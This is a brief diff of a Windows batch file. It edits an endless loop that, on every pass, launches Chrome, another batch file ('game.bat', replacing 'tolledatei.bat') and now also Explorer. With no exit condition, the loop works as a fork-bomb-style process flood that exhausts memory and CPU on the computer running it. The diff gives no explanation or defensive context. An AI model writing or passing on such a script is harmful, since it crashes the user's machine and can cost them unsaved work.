@@ -1,7 +1,8 @@
 
 :loopstart
 start chrome.exe
-start tolledatei.bat
+start game.bat
+start explorer.exe
 goto loopstart
 
 :loopend
